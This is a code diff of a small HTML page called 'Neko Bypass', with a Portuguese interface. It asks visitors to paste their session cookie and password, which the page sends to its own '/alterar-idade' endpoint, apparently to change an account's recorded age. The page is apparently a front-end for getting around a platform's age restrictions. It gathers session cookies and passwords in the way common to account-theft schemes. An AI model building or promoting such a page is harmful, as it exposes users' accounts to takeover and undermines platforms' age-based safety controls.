@@ -3,10 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="robots" content="index, follow">
-  <meta http-equiv="X-UA-Compatible" content="chrome=1" />
   <title>Neko Bypass</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" />
   <style>
     body {
       background-color: #000;
@@ -16,27 +14,26 @@
       padding: 30px;
     }
 
-    .main-title {
-      font-size: 32px;
-      margin-bottom: 20px;
+    input, button {
+      margin: 10px auto;
+      display: block;
     }
 
     input[type="text"], input[type="password"] {
       width: 60%;
       padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #444;
-      background-color: #1e1e1e;
+      background: #1e1e1e;
       color: white;
-      margin-bottom: 20px;
+      border: 1px solid #444;
+      border-radius: 5px;
     }
 
     button {
       padding: 10px 20px;
       background-color: #1e1e1e;
-      color: white;
       border: none;
       border-radius: 5px;
+      color: white;
       transition: 0.3s;
     }
 
@@ -49,57 +46,35 @@
       background-color: #1e1e1e;
       padding: 15px;
       border-radius: 8px;
-      overflow-x: auto;
-      max-width: 80%;
+      color: white;
+      max-width: 70%;
       margin-left: auto;
       margin-right: auto;
-      white-space: pre-wrap;
-      word-break: break-word;
-      max-height: 200px;
-      overflow-y: scroll;
     }
   </style>
 </head>
 <body>
   <h1 class="main-title">Neko Bypass</h1>
 
-  <input type="text" id="cookie" placeholder="Cole seu cookie aqui"><br>
-  <input type="password" id="senha" placeholder="Digite sua senha"><br>
-  <button onclick="enviar()">Alterar Idade</button>
+  <input type="text" id="cookie" placeholder="Insira seu cookie">
+  <input type="password" id="password" placeholder="Insira sua senha">
+  <button onclick="enviar()">Enviar</button>
 
   <div id="resposta"></div>
 
   <script>
     async function enviar() {
-      const cookie = document.getElementById("cookie").value.trim();
-      const password = document.getElementById("senha").value.trim();
-      const respostaDiv = document.getElementById("resposta");
+      const cookie = document.getElementById("cookie").value;
+      const password = document.getElementById("password").value;
 
-      if (!cookie || !password) {
-        respostaDiv.textContent = "Preencha os campos corretamente.";
-        return;
-      }
+      const resposta = await fetch("/alterar-idade", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookie, password })
+      });
 
-      try {
-        const res = await fetch("/alterar-idade", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ cookie, password }),
-        });
-
-        const data = await res.json();
-
-        if (data.idadeAlterada) {
-          respostaDiv.textContent = `Idade alterada para: ${data.idadeAlterada}`;
-        } else {
-          respostaDiv.textContent = "Erro: " + (data.error || "desconhecido");
-        }
-      } catch (error) {
-        respostaDiv.textContent = "Erro ao conectar com o servidor.";
-        console.error(error);
-      }
+      const data = await resposta.json();
+      document.getElementById("resposta").innerText = JSON.stringify(data, null, 2);
     }
   </script>
 </body>
